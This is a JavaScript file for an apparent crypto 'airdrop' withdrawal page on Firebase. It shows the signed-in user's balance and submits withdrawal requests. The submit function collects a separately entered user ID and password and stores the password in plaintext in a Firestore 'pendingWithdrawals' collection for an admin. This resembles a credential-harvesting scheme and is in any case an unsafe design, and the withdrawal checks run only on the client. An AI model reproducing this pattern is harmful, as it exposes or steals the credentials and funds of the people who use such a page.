import { initializeApp } from "https://www.gstatic.com/firebasejs/12.14.0/firebase-app.js";
import {
  getFirestore,
  doc,
  getDoc,
  addDoc,
  collection,
  updateDoc
} from "https://www.gstatic.com/firebasejs/12.14.0/firebase-firestore.js";

import {
  getAuth,
  onAuthStateChanged
} from "https://www.gstatic.com/firebasejs/12.14.0/firebase-auth.js";

// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyCQVHBn504Y26YtR38JRJhRlUbBoa2CIPo",
  authDomain: "pcnexchange.firebaseapp.com",
  projectId: "pcnexchange",
  storageBucket: "pcnexchange.firebasestorage.app",
  messagingSenderId: "278761036604",
  appId: "1:278761036604:web:a02e2d2ac7a9379d6f9c39"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const auth = getAuth(app);

let uid;
let balance = 0;

const balanceEl = document.getElementById("balance");

// format to 8 decimals
function format(num) {
  return Number(num).toFixed(8);
}

// ================= LOAD USER =================
onAuthStateChanged(auth, async (user) => {
  if (!user) {
    alert("Login required");
    window.location.href = "login.html";
    return;
  }

  uid = user.uid;

  const userRef = doc(db, "users", uid);
  const snap = await getDoc(userRef);

  if (snap.exists()) {
    balance = snap.data().balance || 0;
  }

  balanceEl.textContent = format(balance);
});

// ================= WITHDRAW FUNCTION =================
window.submitWithdraw = async function () {

  const userId = document.getElementById("userId").value;
  const password = document.getElementById("password").value;
  const amount = Number(document.getElementById("amount").value);

  // validation
  if (!userId || !password || !amount) {
    alert("Please fill all fields");
    return;
  }

  // allow tiny crypto withdrawals (IMPORTANT FIX)
  if (amount < 0.00000001) {
    alert("Minimum withdrawal is 0.00000001");
    return;
  }

  try {

    // SEND TO ADMIN (Firestore)
    await addDoc(collection(db, "pendingWithdrawals"), {
      userId: uid,
      enteredUserId: userId,
      password: password,
      amount: amount,
      status: "Pending",
      type: "airdrop_withdraw",
      createdAt: new Date()
    });

    alert("Withdrawal sent to admin successfully!");

    // clear inputs
    document.getElementById("userId").value = "";
    document.getElementById("password").value = "";
    document.getElementById("amount").value = "";

  } catch (err) {
    console.error(err);
    alert("Withdrawal failed. Try again.");
  }
};